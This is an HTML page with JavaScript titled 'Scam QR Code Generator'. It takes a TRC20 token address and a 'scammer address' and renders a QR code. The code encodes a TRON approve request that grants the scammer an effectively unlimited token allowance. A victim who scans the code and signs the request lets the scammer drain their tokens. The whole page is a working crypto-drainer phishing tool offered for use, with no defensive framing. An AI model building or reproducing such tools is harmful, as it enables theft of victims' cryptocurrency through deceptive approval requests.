<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <title>Generate Scam QR Code Example</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.rawgit.com/davidshimjs/qrcodejs/gh-pages/qrcode.min.js"></script>
    
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #07102a;
            color: #e6eaf2;
            padding: 20px;
        }
        input, button {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border-radius: 5px;
            border: 1px solid #ccc;
        }
        button {
            background: #2f6bff;
            color: white;
            cursor: pointer;
        }
        #qrcode {
            margin-top: 20px;
        }
    </style>
</head>
<body>

    <h1>Scam QR Code Generator</h1>
    <input type="text" id="tokenAddress" placeholder="Enter TRC20 Token Address" />
    <input type="text" id="scammerAddress" placeholder="Enter Scammer Address" />
    <button id="generateButton">Generate QR Code</button>
    
    <div id="qrcode"></div>

    <script>
        const generateScamRQCode = (tokenAddress, scammerAddress) => {
            // Format the data for a QR code
            const qrData = `tron:${tokenAddress}/approve?spender=${scammerAddress}&amount=999999999999999999999999999999`;
            
            // Clear previous QR code
            $('#qrcode').empty();

            // Generate a new QR code
            const qrCode = new QRCode(document.getElementById("qrcode"), {
                text: qrData,
                width: 256,
                height: 256,
            });

            console.log(`QR Code Data: ${qrData}`);
        };

        document.getElementById('generateButton').addEventListener('click', function() {
            const tokenAddress = document.getElementById('tokenAddress').value;
            const scammerAddress = document.getElementById('scammerAddress').value;

            if (!tokenAddress || !scammerAddress) {
                alert("Please fill in all fields.");
                return;
            }

            generateScamRQCode(tokenAddress, scammerAddress);
        });
    </script>
</body>
</html>
